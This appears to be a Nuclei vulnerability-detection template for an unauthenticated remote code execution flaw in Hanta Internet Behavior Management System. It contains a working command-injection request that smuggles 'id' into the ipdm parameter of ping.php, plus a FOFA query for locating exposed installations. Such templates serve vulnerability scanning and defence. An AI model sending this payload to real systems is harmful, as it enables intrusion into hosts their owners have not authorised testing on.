http:
- matchers:
  - part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
    type: regex
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/dgn/dgn_tools/ping.php?ipdm=2;id;'
id: hanta-rce
info:
  author: momika233
  description: Hanta Internet Behavior Management System is vulnerable to RCE.
  metadata:
    fofa-query: "app=\"\u6C49\u5854\u79D1\u6280\u4E0A\u7F51\u884C\u4E3A\u7BA1\u7406\
      \u7CFB\u7EDF\""
    max-request: 1
    verified: true
  name: Hanta Internet Behavior Management System - Remote Code Execution
  severity: high
  tags: hanta,rce,unauth
